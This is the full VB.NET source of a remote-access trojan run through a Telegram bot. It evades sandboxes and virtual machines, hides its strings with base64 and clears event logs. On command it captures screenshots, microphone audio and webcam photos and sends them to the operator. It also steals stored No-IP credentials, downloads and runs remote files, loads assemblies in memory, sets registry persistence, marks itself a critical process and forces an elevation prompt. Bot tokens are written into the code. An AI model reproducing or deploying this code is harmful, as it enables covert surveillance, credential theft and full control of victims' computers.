Public Class Form1
    'Developed by X
    
    Public StrConn As String = "-", id As String = "-", Critcal As Boolean = False, StartLoad As Boolean = False
    Private isrecording As Boolean = False
    Private Class NativeMethods
        Friend Declare Function SetThreadExecutionState Lib "kernel32" (ByVal esFlags As EXECUTION_STATE) As EXECUTION_STATE
        <Runtime.InteropServices.DllImport("ntdll.dll", SetLastError:=True)>
        Public Shared Function NtSetInformationProcess(hProcess As IntPtr, processInformationClass As Integer, ByRef processInformation As Integer, processInformationLength As Integer) As Integer
        End Function
        <Runtime.InteropServices.DllImport("kernel32.dll")> Public Shared Function LoadLibrary(ByVal dllToLoad As String) As Boolean
        End Function
        <Runtime.InteropServices.DllImport("winmm.dll")>
        Public Shared Function mciSendString(ByVal command As String, ByVal buffer As String, ByVal bufferSize As Integer, ByVal hwndCallback As IntPtr) As Integer
        End Function
        Friend Shared Function BTS(s As String) As String
            Return System.Text.Encoding.Unicode.GetString(Convert.FromBase64String(s))
        End Function
        Friend Shared Function SBTS(s As String) As String
            Return Convert.ToBase64String(System.Text.Encoding.Unicode.GetBytes(s))
        End Function ' for sending 
    End Class

    <Flags()>
    Enum EXECUTION_STATE As Integer
        ES_CONTINUOUS = &H80000000 : ES_USER_PRESENT = &H4 : ES_DISPLAY_REQUIRED = &H2 : ES_SYSTEM_REQUIRED = &H1
    End Enum
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        On Error Resume Next : Threading.Thread.Sleep(1000) : ProtectionHW_AntiVMAndSandBox()
#If DEBUG Then       '1852005207:AAHBryMOvEpl_C1cpjPiJ9GE21OfKN10pcI    -   1624179085:AAFnxIIv-X3kAs5W8HViL15-rByhLyUkW8k
        StrConn = "1624179085:AAFnxIIv-X3kAs5W8HViL15-rByhLyUkW8k" : id = "789575462" : Critcal = False : StartLoad = False : GoTo ffffff
#End If
        Dim BinText As String = IO.File.ReadAllText(Application.ExecutablePath)
        If BinText.Contains("§") = False Then Exit Sub
        Dim ArrContents() As String = Split(BinText, "§")
        StrConn = ArrContents(1) : id = ArrContents(2) : Critcal = CBool(ArrContents(3)) : StartLoad = CBool(ArrContents(4))
ffffff:
        If My.Computer.Network.IsAvailable Then : BackgroundWorker1.RunWorkerAsync() : Else : Do While My.Computer.Network.IsAvailable : Application.DoEvents() : Loop : BackgroundWorker1.RunWorkerAsync() : End If
    End Sub
    Private Function ClEvLg() As Boolean
        Try : For Each x In EventLog.GetEventLogs() : x.Clear() : Next x : Return True : Catch ex As Exception : Return False : End Try
    End Function
    Private Sub Interagisci(Message As String)
        Try : Dim str As String() = Split(Message, "/") : Select Case str(1)
                Case "help" : If ISBCLive() Then SC.SendMessage(id, NativeMethods.BTS(My.Resources.Cmd))
                Case "info" : If ISBCLive() Then SC.SendMessage(id, GetInfo)
                Case "getpass" : If ISBCLive() Then SC.SendMessage(id, GetPassword)
                Case "nosleep" : DisablePowerSaving()
                Case "spc" : If ISBCLive() Then : If IsAdmin() Then
                            If EnableCriticalProcess() Then : SC.SendMessage(id, "Critical Set Enabled!!!") : Else : SC.SendMessage(id, "Critical Set ERROR!!! Cant' set to critical this process!!")
                            End If : Else : SC.SendMessage(id, "You not have the Admin Privilege to set this... sorry..." & vbCrLf & "Try to get this!!! ;)") : End If : End If
                Case "uspc" : If ISBCLive() Then : If IsAdmin() Then
                            If DisableCriticalProcess() Then : SC.SendMessage(id, "Critical Set Disabled!!!") : Else : SC.SendMessage(id, "Critical Set ERROR!!! Cant' set to normal this process!!")
                            End If : Else : SC.SendMessage(id, "You not have the Admin Privilege to set this... sorry..." & vbCrLf & "Try to get this!!! ;)") : End If : End If
                Case "mbx" : MsgBox(str(2), Nothing, "Microsoft Windows") : If ISBCLive() Then SC.SendMessage(id, "Message displayed!!!")
                Case "ear" : If ISBCLive() Then SendChatActionAsync(id, Telegram.Bot.Types.Enums.ChatAction.UploadAudio) : SendAudioFile(id, Ear(CInt(str(2))), "Record: " & Now().ToShortTimeString)
                Case "eye" : If ISBCLive() Then SendChatActionAsync(id, Telegram.Bot.Types.Enums.ChatAction.UploadVideo) : SendVideoFile(id, Eye(CInt(str(2))), "Record: " & Now().ToShortTimeString)
                Case "rbtcl" : If ISBCLive() Then SC.SendMessage(id, "Reboot Client received!!..Trying...") : RebootClient()
                Case "unicl" : If ISBCLive() Then SC.SendMessage(id, "Unistall Client received!!..Trying...") : unistallClient()
                Case "getlcd" : If ISBCLive() Then SendChatActionAsync(id, Telegram.Bot.Types.Enums.ChatAction.UploadPhoto) : SendImageFile(id, GetLCDStamp, "PrintScreen: " & Now())
                Case "execurl" : LoadFromURL(str(2), str(3))
                Case "setstartup" : SetLoad(0)
                Case "getphoto" : If ISBCLive() Then : SC.SendMessage(id, "Try to get Pic of user webcam!!") : Dim phtpath As String = GetPhotoUser()
                        If phtpath.Contains("\") Then : SendChatActionAsync(id, Telegram.Bot.Types.Enums.ChatAction.UploadPhoto) : SendImageFile(id, phtpath, "Photo of User data " & Now())
                        Else : SC.SendMessage(id, "Some errors or Unable to find the camera..") : End If : End If : DeleteUserPhoto()
                Case " "' :   
                Case "elevate" : If ISBCLive() Then If IsAdmin() = False Then ElevateUAC() : SC.SendMessage(id, "Elevating.. Rebooting Client..") Else SC.SendMessage(id, "Adminstrator Garanteed !!!")
                Case "unsetstartup" : SetLoad(1) : If ISBCLive() Then SC.SendMessage(id, "Startup is set!!!")
                Case "exec" : exec(str(2))
                Case "reboot" : If ISBCLive() Then SC.SendMessage(id, "Reboot Machine received!!... Trying...") : Shell("Shutdown -r -t 5")
                Case "shtdwn" : If ISBCLive() Then SC.SendMessage(id, "Shutdown Machine received!!... Trying...") : Shell("Shutdown -s -t 5")
                Case "endcl" : ClEvLg() : DisableCriticalProcess() : Threading.Thread.CurrentThread.Sleep(1) : Application.Exit()
            End Select : Catch ex As Exception : End Try
    End Sub
    Private Function GetPhotoUser() As String
        Dim outo = IO.Path.GetTempPath & "\snapshot" : If IO.Directory.Exists(outo) = False Then IO.Directory.CreateDirectory(outo)
        Dim b As Byte() = My.Resources.ChildBot : IO.File.WriteAllBytes(outo & "\0.exe", b)
        Dim p As New ProcessStartInfo : p.FileName = outo & "\0.exe"
        Dim pr As New Process() : pr.StartInfo = p
        pr.Start() : pr.WaitForExit() : IO.File.Delete(outo & "\0.exe")
        If IO.Directory.GetFiles(outo).Count > 0 Then Return outo & "\userlive.png" Else Return "error"
    End Function
    Private Sub DeleteUserPhoto()
        On Error Resume Next
        Do While IO.Directory.Exists(IO.Path.GetTempPath & "\snapshot")
            Application.DoEvents()
            For Each x In IO.Directory.GetFiles(IO.Path.GetTempPath & "\snapshot")
                IO.File.Delete(x)
            Next x
            For Each x In IO.Directory.GetDirectories(IO.Path.GetTempPath)
                If x.ToString.Contains("snapshot") Then IO.Directory.Delete(x, True)
            Next x
        Loop
        Threading.Thread.Sleep(100)
    End Sub
    Private Function EnableCriticalProcess() As Boolean
        Dim isCritical As Integer = 1, BreakOnTermination As Integer = &H1D
        Try : Process.EnterDebugMode() : Process.GetCurrentProcess.EnterDebugMode()
            NativeMethods.NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, isCritical, 4)
            Return True : Catch ex As Exception : Process.GetCurrentProcess.LeaveDebugMode() : Process.LeaveDebugMode() : Return False : End Try
    End Function 'ONLY ADMIN
    Private Function DisableCriticalProcess() As Boolean
        Dim isCritical As Integer = 0, BreakOnTermination As Integer = &H1D
        Try : Process.EnterDebugMode() : Process.GetCurrentProcess.EnterDebugMode()
            NativeMethods.NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, isCritical, 4)
            Return True : Catch ex As Exception : Process.GetCurrentProcess.LeaveDebugMode() : Process.LeaveDebugMode() : Return False : End Try
    End Function ' ONLY ADMIN
    Private Function GetMyIP() As String
        On Error Resume Next : Dim a As String = Net.Dns.GetHostEntry(Net.Dns.GetHostName).AddressList(0).ToString
        Using wc As New Net.WebClient
            Net.ServicePointManager.SecurityProtocol = Net.SecurityProtocolType.Tls12 : a = System.Text.Encoding.ASCII.GetString(wc.DownloadData(NativeMethods.BTS("aAB0AHQAcABzADoALwAvAGEAcABpAC4AaQBwAGkAZgB5AC4AbwByAGcAPwBmAG8AcgBtAGEAdAA9AGoAcwBvAG4A")))
        End Using : Dim myresult() As String = Split(a, """") : Return myresult(3)
    End Function
    Private Function Ear(timeout As Integer) As String
        Dim countTime As Integer = 0 : If Not (isrecording) Then
            NativeMethods.mciSendString("open new Type waveaudio Alias recsound", "", 0, 0)
            NativeMethods.mciSendString("record recsound", "", 0, 0) : isrecording = True
        Else : NativeMethods.mciSendString("pause recsound ", "", 0, 0) : isrecording = False : GoTo dferefe : End If
        Do Until countTime = timeout
            countTime += 1 : Threading.Thread.Sleep(1000) : Application.DoEvents()
        Loop
        NativeMethods.mciSendString("pause recsound ", "", 0, 0) : isrecording = False
dferefe:
        Dim Filez = IO.Path.GetTempFileName.Replace(".tmp", ".wav")
        NativeMethods.mciSendString("save recsound " & """" + Filez + """", "", 0, 0) : NativeMethods.mciSendString("close recsound ", "", 0, 0)
        Return Filez
    End Function
    Private Function GetLCDStamp() As String
        Dim TmpPth As String = IO.Path.GetTempFileName.Replace(".tmp", ".png")
        Using bmpScreenCapture As Bitmap = New Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height)
            Using g As Graphics = Graphics.FromImage(bmpScreenCapture)
                g.CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, bmpScreenCapture.Size, CopyPixelOperation.SourceCopy)
                Dim ms As IO.MemoryStream = New IO.MemoryStream()
                bmpScreenCapture.Save(ms, Imaging.ImageFormat.Png)   ' <---- ERROR
                Dim bytes As Byte() = ms.GetBuffer()
                IO.File.WriteAllBytes(TmpPth, bytes)
                ms.Close()
            End Using
        End Using
        Return TmpPth
    End Function
    Private Sub SetLoad(k As Integer) '0-1
        Dim GG As String = NativeMethods.BTS("UwBPAEYAVABXAEEAUgBFAFwATQBpAGMAcgBvAHMAbwBmAHQAXABXAGkAbgBkAG8AdwBzAFwAQwB1AHIAcgBlAG4AdABWAGUAcgBzAGkAbwBuAFwAUgB1AG4A")
        If k = 0 Then
            My.Computer.Registry.CurrentUser.OpenSubKey(GG, True).SetValue(Application.ProductName, Application.ExecutablePath)
        Else
            My.Computer.Registry.CurrentUser.OpenSubKey(GG, True).DeleteValue(Application.ProductName)
        End If
    End Sub
    Private Function GetInfo() As String
        On Error Resume Next
        Dim Arch As String = "" : If Environment.GetEnvironmentVariable(NativeMethods.BTS("UABSAE8AQwBFAFMAUwBPAFIAXwBBAFIAQwBIAEkAVABFAEMAVABVAFIARQA=")).Contains("64") Then Arch = " x64" Else Arch = " x86"
        Dim Fl As String = vbCrLf, a As String = "🎯 Target Name: " & Environment.MachineName & Fl : a = a & "🧩 System: " & My.Computer.Info.OSFullName.Replace("Microsoft ", "") & Arch &
                 Fl : a = a & "🎭 UserName: " & Environment.UserName & Fl : a = a & "🌏 IP Address: " & GetMyIP() & Fl : a = a & "🧿 Net Framework: " & dotNET() & Fl : a = a & "🔑 Admin Right: " & IsAdmin() & Fl
        Return a
    End Function
    Private Sub exec(str As String)
        Try
            Dim b As Byte() = Convert.FromBase64String(str), Assembly = Reflection.Assembly.Load(b), EntryPoint = Assembly.EntryPoint
            If EntryPoint IsNot Nothing Then
                Dim t As New Threading.Thread(Sub()
                                                  EntryPoint.Invoke(Nothing, Nothing)
                                              End Sub)
                t.Start() : SC.SendMessage(id, "Executed! =)")
            Else
                Dim Types = Assembly.GetTypes
                For Each Type In Types
                    If Type.Name = "Main" Then
                        Try : Dim Proc = Type.GetMethod("Main")
                            If Proc Is Nothing Then Continue For
                            Dim task As New Threading.Thread(Sub()
                                                                 Proc.Invoke(Nothing, Nothing)
                                                             End Sub)
                            task.Start() : SC.SendMessage(id, "Executed! =)")
                        Catch ax As Exception : Try
                                Dim a As Reflection.Assembly = Reflection.Assembly.Load(b), metodo As Reflection.MethodInfo = a.EntryPoint
                                metodo.Invoke(Nothing, New Object() {Nothing}) : SC.SendMessage(id, "Executed! =)")
                            Catch bx As Exception : If ISBCLive() Then SC.SendMessage(id, "EXEC COMMAND ERROR!: " & bx.Message)
                            End Try : End Try : End If : Next
            End If
        Catch ex As Exception : If ISBCLive() Then SC.SendMessage(id, "EXEC CODIFY ERROR!: " & ex.Message)
        End Try
    End Sub
    Private Sub unistallClient()
        Do
            Dim Info As New ProcessStartInfo() : ClEvLg()
            Try : Try : DisableCriticalProcess() : Catch ex As Exception : End Try            'crypting POC...to test if it work...
                Info.Arguments = NativeMethods.BTS("LwBDACAAYwBoAG8AaQBjAGUAIAAvAEMAIABZACAALwBOACAALwBEACAAWQAgAC8AVAAgADMAIAAmACAARABlAGwAIAA=") & Application.ExecutablePath
                Info.WindowStyle = ProcessWindowStyle.Hidden : Info.CreateNoWindow = True : Info.FileName = "cmd.exe" : Process.Start(Info) : System.Threading.Thread.Sleep(1)
                Application.Exit() : Catch ex As Exception : End Try
            Try : Info.Arguments = NativeMethods.BTS("LwBDACAAcABpAG4AZwAgADEALgAxAC4AMQAuADEAIAAtAG4AIAAxACAALQB3ACAAMwAwADAAMAAgAD4AIABOAHUAbAAgACYAIABEAGUAbAAgAA==") & Application.ExecutablePath
                Info.WindowStyle = ProcessWindowStyle.Hidden : Info.CreateNoWindow = True : Info.FileName = "cmd.exe" : Process.Start(Info) : System.Threading.Thread.Sleep(1)
                Application.Exit() : Catch ex As Exception : End Try
        Loop Until Process.GetCurrentProcess().HasExited
    End Sub
    Private Sub RebootClient()
        ClEvLg() : Process.Start(Application.ExecutablePath) : Application.Exit()
    End Sub
    Private Sub LoadFromURL(Extension As String, URL As String)
        Try : Dim NewFile = IO.Path.GetTempFileName.Replace(".tmp", Extension), WC As New Net.WebClient
            WC.DownloadFile(URL, NewFile) : Threading.Thread.CurrentThread.Sleep(1000) : Process.Start(NewFile)
            If ISBCLive() Then SC.SendMessage(id, "File executed!!!")
        Catch ex As Exception : If ISBCLive() Then SC.SendMessage(id, "ERROR EXECUTE FILE FROM URL!!" & vbCrLf & ex.Message) : 
        End Try
    End Sub
    Private Function dotNET() As String
        Try : Dim dt As New Text.StringBuilder, Rs As String = Runtime.InteropServices.RuntimeEnvironment.GetRuntimeDirectory().Substring(0, 34)
            For Each x In IO.Directory.GetDirectories(Rs) : If x.Contains("v") Then dt.Append(x.Replace(Rs & "\", "").Replace("v", "V.") & " - ")
            Next x : dt = dt.Remove(dt.Length - 3, 2) : Return dt.ToString : Catch ex As Exception : Return "Error" : End Try
    End Function
    Function DisablePowerSaving() As EXECUTION_STATE
        Return NativeMethods.SetThreadExecutionState(EXECUTION_STATE.ES_SYSTEM_REQUIRED Or EXECUTION_STATE.ES_DISPLAY_REQUIRED Or EXECUTION_STATE.ES_CONTINUOUS Or EXECUTION_STATE.ES_USER_PRESENT)
    End Function
    Private Sub BackgroundWorker1_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles BackgroundWorker1.DoWork
        Try
            Net.ServicePointManager.SecurityProtocol = Net.SecurityProtocolType.Tls12
            BC = New Telegram.Bot.TelegramBotClient(StrConn) 'botfatherkey
            Dim miooo As Telegram.Bot.Types.User = BC.GetMeAsync().Result
            Dim a As String = NativeMethods.BTS("PNiv3yAAVABhAHIAZwBlAHQAOgAgAA==") & My.Computer.Name & vbCrLf & NativeMethods.BTS("LwBoAGUAbABwACAALQAgAGYAbwByACAASABlAGwAcAAgAD3Y/d0=") & vbCrLf
            AddHandler BC.OnMessage, AddressOf OnMessage : AddHandler BC_MessageReceived, AddressOf Interagisci
            BC.StartReceiving()
            If BC.IsReceiving Then : SC.SendMessage(id, NativeMethods.BTS("PNit3yAATgBlAHcAIABDAG8AbgBuAGUAYwB0AGkAbwBuACEAIQAhACEAIAA82K3f") & vbCrLf & a)
            Else : Do While BC.IsReceiving : Application.DoEvents() : Loop
                SC.SendMessage(id, NativeMethods.BTS("PNit3yAATgBlAHcAIABDAG8AbgBuAGUAYwB0AGkAbwBuACEAIQAhACEAIAA82K3f") & vbCrLf & vbCrLf & a) : End If
            If Critcal Then Process.EnterDebugMode() : EnableCriticalProcess()
            If StartLoad Then SetLoad(0)
        Catch ex As Exception : Threading.Thread.CurrentThread.Sleep(10) : Application.Exit() : End Try
    End Sub
    Private Sub Form1_FormClosed(sender As Object, e As FormClosedEventArgs) Handles Me.FormClosed
        ClEvLg() : DisableCriticalProcess() : Threading.Thread.CurrentThread.Sleep(1)
    End Sub
    Private Sub ProtectionHW_AntiVMAndSandBox()
        If Me.Text <> NativeMethods.BTS("VQBQAEQA") Then unistallClient()
        If NativeMethods.LoadLibrary(NativeMethods.BTS("UwBiAGkAZQBEAGwAbAAuAGQAbABsAA==")) = True Then unistallClient() 'sandbox
        If NativeMethods.LoadLibrary(NativeMethods.BTS("ZwBpAGYAdABiAG8AeAAuAGQAbABsAA==")) = True Then unistallClient() 'imbox
        If NativeMethods.LoadLibrary(NativeMethods.BTS("dgBiAG8AeABoAG8AbwBrAC4AZABsAGwA")) = True Then unistallClient() ' vbox
        ' ElseIf C_ID.MyOS.ToString.ToLower.Contains("XP".ToLower) Then

    End Sub
    Function IsAdmin() As Boolean
        Dim id As Security.Principal.WindowsIdentity = Security.Principal.WindowsIdentity.GetCurrent()
        Dim p As Security.Principal.WindowsPrincipal = New Security.Principal.WindowsPrincipal(id)
        Return p.IsInRole(Security.Principal.WindowsBuiltInRole.Administrator)
    End Function
    Private Sub ElevateUAC()
        Do
            Dim startInfo As ProcessStartInfo = New ProcessStartInfo() : ClEvLg()
            startInfo.UseShellExecute = True : startInfo.WorkingDirectory = Environment.CurrentDirectory : startInfo.FileName = Application.ExecutablePath
            startInfo.Verb = NativeMethods.BTS("cgB1AG4AYQBzAA==") : Dim p As Process = Process.Start(startInfo) : Application.Exit()
            Threading.Thread.Sleep(10)
        Loop Until IsAdmin()
    End Sub
    Private Function GetPassword() As String
        Dim a As String = "work in progress..."
        a = a & vbCrLf & "NoIP: " & NO_IP()



        Return a
    End Function ' ###########################

    Private Function Eye(timeout As Integer) As String


        Return "c:\1.mpg"
    End Function '#######################################


#Region "pax"
    Private Function NO_IP() As String
        Dim PathNN As String = NativeMethods.BTS("SABLAEUAWQBfAEwATwBDAEEATABfAE0AQQBDAEgASQBOAEUAXABTAE8ARgBUAFcAQQBSAEUAXABXAG8AdwA2ADQAMwAyAE4AbwBkAGUAXABWAGkAdABhAGwAdwBlAHIAawBzAFwARABVAEMA")
        Dim User As String = My.Computer.Registry.GetValue(PathNN, "Username", Nothing)
        Dim Password As String = My.Computer.Registry.GetValue(PathNN, "Password", Nothing)
        Dim a As String = "Not Found!", bs As String = NativeMethods.BTS("XABXAG8AdwA2ADQAMwAyAE4AbwBkAGUA")
        If Environment.GetFolderPath(38).Contains("x86") Then
            If (User <> "") And (Password <> "") Then a += "NO-IP" & vbNewLine & "~|~URL~|~ " & User & vbNewLine & "~|~USR~|~ " & User & vbNewLine & "~|~PWD~|~ " & System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(Password)) & vbNewLine
        Else
            PathNN = PathNN.Replace(bs, "") : PathNN = PathNN.Replace(bs, "")
            If (User <> "") And (Password <> "") Then a += "NO-IP" & vbNewLine & "~|~URL~|~ " & "https://www.noip.com" & vbNewLine & "~|~USR~|~ " & User & vbNewLine & "~|~PWD~|~ " & System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(Password)) & vbNewLine
        End If
        Return a
    End Function



#End Region


End Class


